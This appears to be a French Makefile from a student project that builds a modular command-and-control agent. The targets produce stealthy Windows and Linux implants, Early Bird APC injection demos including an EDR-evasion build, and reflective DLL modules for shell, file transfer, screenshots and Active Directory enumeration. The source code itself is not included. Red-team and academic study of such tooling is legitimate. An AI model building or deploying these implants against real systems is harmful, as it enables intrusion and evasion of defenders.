# ============================================================
#  Makefile — Agent C2 modulaire (El Mazdougui Anass, PFE 2026)
#
#  AGENTS :
#    make windows          → agent.exe          (prod, furtif — VirtualFree)
#    make windows-keep     → agent_keep.exe     (debug — KEEP_RDLL_LOADED)
#    make windows32        → Agents32/agent.exe (32 bits)
#    make linux            → agent_linux        (64 bits)
#
#  MODULES (technique RDLL uniquement) :
#    make dll-x64          → *.x64.dll (Reflective DLL Loading, T1620)
#
#  NETTOYAGE :
#    make clean            → supprime agent.exe / agent_keep.exe
#    make clean-modules    → supprime les .dll compilés
#    make clean-all        → clean + clean-modules
#
#  PRÉREQUIS (MSYS2 MinGW64) :
#    pacman -S mingw-w64-x86_64-gcc mingw-w64-i686-gcc
# ============================================================

# ── Sources de l'agent ───────────────────────────────────────
SRCS = main.c               \
       utils.c              \
       http.c               \
       core.c               \
       tunnel.c             \
       execution_engine.c   \
       rdll_loader.c        \
       coff_loader.c        \
       apc_loader.c         \
       apcinject_loader.c   \
       rundll32_loader.c    \
       wpr_loader.c         \
       wermgr_loader.c      \
       beacon_compatibility.c \
       payload_obfuscation.c \
       cJSON.c

# ── Répertoires ──────────────────────────────────────────────
BOF_SRCS_DIR = modules/dll
BOF_OUT_DIR  = ../../server/modules
BOF_MODULES  = screenshot sysinfo shell fileops process download upload adcomputers adusers adgroups adgpo adspn adpreauth adou adpwdpolicy admaq

# ── Compilateurs ─────────────────────────────────────────────
CC_WIN64  = x86_64-w64-mingw32-gcc
CC_WIN32  = /c/msys64/mingw32/bin/i686-w64-mingw32-gcc
CC_LIN    = gcc

# ================================================================
#  AGENT WINDOWS 64 bits
# ================================================================
CFLAGS_WIN  = -O2 -s -Wall -DPLATFORM_WINDOWS
LDFLAGS_WIN = -lwinhttp -lws2_32 -lgdi32 -static-libgcc

windows: $(SRCS)
	$(CC_WIN64) $(SRCS) -o agent.exe $(CFLAGS_WIN) $(LDFLAGS_WIN)
	@echo "[OK] agent.exe (x64, VirtualFree actif)"

windows-keep: $(SRCS)
	$(CC_WIN64) $(SRCS) -o agent_keep.exe \
	    $(CFLAGS_WIN) -DKEEP_RDLL_LOADED $(LDFLAGS_WIN)
	@echo "[OK] agent_keep.exe (x64, KEEP_RDLL_LOADED — démo)"

# ================================================================
#  TEST AUTONOME APCINJECT (demo Early Bird APC sans C2)
#  Spawne notepad.exe suspendu, injecte WinExec(mspaint.exe)
#  via QueueUserAPC, verifie que Paint s'ouvre.
#  Usage : apcinject_test.exe [process_cible]
# ================================================================
apcinject-test: apcinject_standalone.c
	$(CC_WIN64) apcinject_standalone.c -o apcinject_test.exe -O2 -Wall
	@echo "[OK] apcinject_test.exe (demo autonome Early Bird APC)"

# Version FURTIVE : memoire RW→RX (jamais RWX) + API resolues
# dynamiquement (anti hook user-mode) — pour demo sous Azure MDE.
apcinject-stealth: apcinject_stealth.c
	$(CC_WIN64) apcinject_stealth.c -o apcinject_stealth.exe -O2 -Wall -s
	@echo "[OK] apcinject_stealth.exe (demo furtive Early Bird APC)"

# ================================================================
#  AGENT WINDOWS 32 bits
# ================================================================
OUT_WIN32 = /c/Users/hp/Desktop/Agents32/agent.exe

windows32: $(SRCS)
	mkdir -p /c/Users/hp/Desktop/Agents32
	PATH="/c/msys64/mingw32/bin:$$PATH" \
	$(CC_WIN32) $(SRCS) -o $(OUT_WIN32) -O2 -Wall \
	    -DPLATFORM_WINDOWS $(LDFLAGS_WIN)
	@echo "[OK] $(OUT_WIN32) (x86)"

# ================================================================
#  AGENT LINUX 64 bits
# ================================================================
CFLAGS_LIN  = -O2 -s -Wall -DPLATFORM_LINUX
LDFLAGS_LIN = -lcurl -lpthread -lm

linux: $(SRCS)
	$(CC_LIN) $(SRCS) -o agent_linux $(CFLAGS_LIN) $(LDFLAGS_LIN)
	@echo "[OK] agent_linux (x64)"

# ================================================================
#  MODULES RDLL — DLL réflective x64  (.x64.dll)
#  Technique RDLL (T1620) — reflective PE loading in-process
#  La DLL embarque beacon_compatibility.c pour BeaconPrintf.
# ================================================================
CFLAGS_DLL64 = -shared -Os -Wall -DRDLL_MODE -DPLATFORM_WINDOWS \
               -I$(BOF_SRCS_DIR)                                 \
               -Wl,--export-all-symbols

define DLL64_RULE
$(BOF_OUT_DIR)/$(1)/$(1).x64.dll: $(BOF_SRCS_DIR)/mod_$(1).c beacon_compatibility.c
	mkdir -p $(BOF_OUT_DIR)/$(1)
	$(CC_WIN64) $(CFLAGS_DLL64) -o $$@ $$^ \
	    -lkernel32 -luser32 -lgdi32 -ladvapi32 -lwldap32
	@echo "[DLL x64] $$@"
endef
$(foreach m,$(BOF_MODULES),$(eval $(call DLL64_RULE,$(m))))

dll-x64: $(foreach m,$(BOF_MODULES),$(BOF_OUT_DIR)/$(m)/$(m).x64.dll)
	@echo "[OK] DLL x64 compilées (RDLL)"

# ================================================================
#  NETTOYAGE
# ================================================================
clean:
	rm -f agent.exe agent_keep.exe agent_linux apcinject_test.exe apcinject_stealth.exe

clean-modules:
	rm -f $(foreach m,$(BOF_MODULES), \
	    $(BOF_OUT_DIR)/$(m)/$(m).x64.dll)

clean-all: clean clean-modules

.PHONY: windows windows-keep windows32 linux \
        dll-x64 apcinject-test apcinject-stealth \
        clean clean-modules clean-all